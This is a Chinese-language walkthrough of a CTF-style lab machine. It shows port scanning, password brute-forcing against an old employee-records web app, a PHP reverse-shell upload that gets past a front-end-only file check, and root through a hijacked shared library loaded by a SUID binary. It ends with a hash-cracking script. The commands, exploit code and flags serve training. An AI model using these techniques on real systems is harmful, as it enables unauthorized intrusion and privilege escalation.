![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)

复盘一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l  
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
Nmap scan report for 192.168.205.174
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
                            
```

看web

![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)

试了一下弱密码，发现可以爆破user

![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)

爆破的同时看了一下源码，发现了他是使用的模板

![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)

下载一份

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：1391869 (1.3M) [application/zip]
正在保存至: “employee_records_system.zip”

employee_records_system.zip                  100%[============================================================================================>]   1.33M   200KB/s  用时 6.8s    

2025-07-10 09:59:44 (200 KB/s) - 已保存 “employee_records_system.zip” [1391869/1391869])

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip employee_records_system.zip
Archive:  employee_records_system.zip
   creating: employee_records_system/css/
  inflating: employee_records_system/css/font-awesome.css  
  inflating: employee_records_system/css/font-awesome.min.css  
   creating: employee_records_system/css/images/
  inflating: employee_records_system/css/images/ui-icons_444444_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_555555_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777620_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777777_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_cc0000_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_ffffff_256x240.png  
  inflating: employee_records_system/css/jquery-ui.css  
  inflating: employee_records_system/css/style.css  
   creating: employee_records_system/dashboard/
  inflating: employee_records_system/dashboard/add_employee.php  
  inflating: employee_records_system/dashboard/add_user.php  
  inflating: employee_records_system/dashboard/addemployee.php  
  inflating: employee_records_system/dashboard/adduser.php  
  inflating: employee_records_system/dashboard/current_employees.php  
  inflating: employee_records_system/dashboard/edit_employee.php  
  inflating: employee_records_system/dashboard/editemployee.php  
  inflating: employee_records_system/dashboard/getData.php  
  inflating: employee_records_system/dashboard/index.php  
  inflating: employee_records_system/dashboard/logout.php  
  inflating: employee_records_system/dashboard/past_employees.php  
  inflating: employee_records_system/dashboard/retrievedata.php  
  inflating: employee_records_system/dashboard/settings.php  
  inflating: employee_records_system/dashboard/uploadID.php  
  inflating: employee_records_system/dashboard/uploadimage.php  
   creating: employee_records_system/database file/
  inflating: employee_records_system/database file/sharp_db.sql  
   creating: employee_records_system/fonts/
  inflating: employee_records_system/fonts/FontAwesome.otf  
  inflating: employee_records_system/fonts/fontawesome-webfont.eot  
  inflating: employee_records_system/fonts/fontawesome-webfont.svg  
  inflating: employee_records_system/fonts/fontawesome-webfont.ttf  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff2  
   creating: employee_records_system/images/
  inflating: employee_records_system/images/body_bg.jpg  
  inflating: employee_records_system/images/logo.png  
  inflating: employee_records_system/images/print.png  
  inflating: employee_records_system/images/times.png  
   creating: employee_records_system/inc/
  inflating: employee_records_system/inc/db_connect.php  
  inflating: employee_records_system/inc/header.php  
  inflating: employee_records_system/index.php  
   creating: employee_records_system/js/
  inflating: employee_records_system/js/global.js  
  inflating: employee_records_system/js/jquery.mask.js  
  inflating: employee_records_system/js/jquery.min.js  
  inflating: employee_records_system/js/jquery-ui.min.js  
   creating: employee_records_system/phpclasses/
  inflating: employee_records_system/phpclasses/pagination.php  
  inflating: employee_records_system/READme.md  
   creating: employee_records_system/uploads/
   creating: employee_records_system/uploads/employees_ids/
  inflating: employee_records_system/uploads/employees_ids/76xq1kHzYEaSZum_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg  
  inflating: employee_records_system/uploads/employees_ids/JeytInUiX9OuLEx_no-image-available.png  
   creating: employee_records_system/uploads/employees_photos/
  inflating: employee_records_system/uploads/employees_photos/G2IHhlrobeUFmQB_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/i0e2fodkG79IDU8_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/ZtYMgxRNGcFn9SQ_avatar.jpg  
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd employee_records_system 
                                     
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
└─$ ls -al
总计 25
drwxr-xr-x 1 kali kali 4096  7月10日 09:59  .
drwxr-xr-x 1 kali kali 8192  7月10日 09:59  ..
drwxr-xr-x 1 kali kali    0 2017年 5月21日  css
drwxr-xr-x 1 kali kali 4096 2017年 5月21日  dashboard
drwxr-xr-x 1 kali kali    0 2017年 5月21日 'database file'
drwxr-xr-x 1 kali kali 4096 2017年 5月21日  fonts
drwxr-xr-x 1 kali kali    0 2017年 5月21日  images
drwxr-xr-x 1 kali kali    0 2017年 5月21日  inc
-rwxr-xr-x 1 kali kali 4037 2021年 2月24日  index.php
drwxr-xr-x 1 kali kali    0 2017年 5月21日  js
drwxr-xr-x 1 kali kali    0 2017年 5月21日  phpclasses
-rwxr-xr-x 1 kali kali  598 2017年 5月21日  READme.md
drwxr-xr-x 1 kali kali    0 2017年 5月21日  uploads
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
└─$ cd 'database file'        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0 2017年 5月21日 .
drwxr-xr-x 1 kali kali 4096  7月10日 09:59 ..
-rwxr-xr-x 1 kali kali 2411 2021年 2月24日 sharp_db.sql
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
└─$ cat sharp_db.sql  
-- phpMyAdmin SQL Dump
-- version 4.5.2
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: May 20, 2017 at 04:21 PM
-- Server version: 5.7.9
-- PHP Version: 5.6.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `sharp_db`
--

-- --------------------------------------------------------

--
-- Table structure for table `sharp_emp`
--

DROP TABLE IF EXISTS `sharp_emp`;
CREATE TABLE IF NOT EXISTS `sharp_emp` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `employee_id` text,
  `first_name` text NOT NULL,
  `middle_name` text,
  `last_name` text NOT NULL,
  `phone` int(11) NOT NULL,
  `employee_image` text NOT NULL,
  `id_type` text NOT NULL,
  `id_number` text NOT NULL,
  `id_card_image` text NOT NULL,
  `residence_address` text NOT NULL,
  `residence_location` text NOT NULL,
  `residence_direction` text NOT NULL,
  `residence_gps` text NOT NULL,
  `next_of_kin` text NOT NULL,
  `relationship` text NOT NULL,
  `phone_of_kin` text NOT NULL,
  `kin_residence` text NOT NULL,
  `kin_residence_direction` text NOT NULL,
  `date_employed` date NOT NULL,
  `job_type` text NOT NULL,
  `status` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `firstname` text NOT NULL,
  `lastname` text NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `accounttype` text NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `firstname`, `lastname`, `username`, `password`, `accounttype`) VALUES
(1, 'Maxwell', 'Morrison', 'xxx2xy', '10a55271c201e41913764ff95b33248b', 'Admin'),
(3, 'Maxwell', 'Morrison', 'admins', '02adcdf2171dc7e5757cdd7c0b91fa03', 'Admin');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
                                       
```

发现了两个用户，和密码哈希（这个密码hash直接拿去john爆破不出来，因为它是(MD5(MD5(password)+MD5(username)))这种架构，这里我没有尝试你们可以尝试一下，还要群里的佬说有一个poc可以利用，我也没有尝试，感兴趣的可以看一下`https://www.exploit-db.com/exploits/49596`），然后我就直接拿admins用户去burp爆破密码了，因为它是默认密码，而且这个模板好像是8年前的，大概率是弱密码来的

密码是admin123

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'admin123' xato-net-10-million-passwords-100000.txt 
15582:admin123
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'admin123' rockyou.txt                             
90006:admin123
10357629:admin123*
```

挺后的，所以直接打poc是最快的

如果你跟我一样登录进来的，点add employee然后照片那里先传一个reverse.png(反弹shell php文件)上去，然后抓包改名就好了，它就只做了前端校验

开抓包
![image-20250710221057739](https://7r1umphk.github.io/image/20250710221057836.webp)

改包

![image-20250710221154470](https://7r1umphk.github.io/image/20250710221154732.webp)

放行

目录扫描看看上传目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.174 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.174
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.205.174/images/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.205.174/uploads/]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 316] [--> http://192.168.205.174/css/]
/index.php            (Status: 200) [Size: 1926]
/js                   (Status: 301) [Size: 315] [--> http://192.168.205.174/js/]
/inc                  (Status: 301) [Size: 316] [--> http://192.168.205.174/inc/]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.205.174/fonts/]
/dashboard            (Status: 301) [Size: 322] [--> http://192.168.205.174/dashboard/]
Progress: 34475 / 1102800 (3.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 35514 / 1102800 (3.22%)
===============================================================
Finished
===============================================================
                      
```

![image-20250710221300132](https://7r1umphk.github.io/image/20250710221300285.webp)

kali开监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...

```

触发

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.174] 54352
Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 10:13:26 up 18 min,  0 users,  load average: 0.38, 0.16, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sML:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

找提权

```
www-data@sML:/$ cd /h
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -> /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ cat us
cat user.txt 
flag{user-fde7951c3a57bc71b03631a9673ab67e}
www-data@sML:/home/yulian$ strings get_root
strings get_root
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
hello
puts
__cxa_finalize
__libc_start_main
libxxoo.so
libc.so.6
GLIBC_2.2.5
/usr/lib/sML
u/UH
[]A\A]A^A_
Starting get_root program...
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_root.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
__libc_start_main@GLIBC_2.2.5
hello
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

群主那个xxoo真是太醒目了
![image-20250710222034547](https://7r1umphk.github.io/image/20250710222034668.webp)

那就动态链接库劫持吧

```
www-data@sML:/home/yulian$ ls -al /usr/lib/sML
ls -al /usr/lib/sML
total 24
drwxr-xr-x  2 root root  4096 Jul  7 06:32 .
drwxr-xr-x 71 root root  4096 Jul  7 06:29 ..
-rwxrwxrwx  1 root root 15984 Jul  7 06:30 libxxoo.so
www-data@sML:/home/yulian$ cd /tmp
cd /tmp
www-data@sML:/tmp$ cat << EOF > shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void hello() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOFcat << EOF > shell.c
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
> 
> void hello() {
>     setuid(0);
>     setgid(0);
>     system("/bin/bash -p");
> }
> 
EOF
www-data@sML:/tmp$ gcc -shared -o libxxoo.so -fPIC shell.c
gcc -shared -o libxxoo.so -fPIC shell.c
www-data@sML:/tmp$ cp libxxoo.so /usr/lib/sML/
cp libxxoo.so /usr/lib/sML/
www-data@sML:/tmp$ cd /h 
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -> /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ ./get_root
./get_root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
flag{root-4c850c5b3b2756e67a91bad8e046ddac}
```

爆破hash参考代码

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a.py           
import hashlib

def crack():
    u = "admins"
    h = "02adcdf2171dc7e5757cdd7c0b91fa03"
    w = r"/usr/share/wordlists/rockyou.txt"

    umd5 = hashlib.md5(u.encode()).hexdigest()

    try:
        with open(w, 'r', encoding='latin-1') as f:
            for line in f:
                p = line.strip()
                pm = hashlib.md5(p.encode()).hexdigest()
                cm = hashlib.md5((pm + umd5).encode()).hexdigest()
                if cm == h:
                    print(f"[+] 密码找到: {p}")
                    return
        print("[-] 未找到")
    except:
        print("文件错误")

if __name__ == '__main__':
    crack()
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py
[+] 密码找到: admin123
                                                 
```

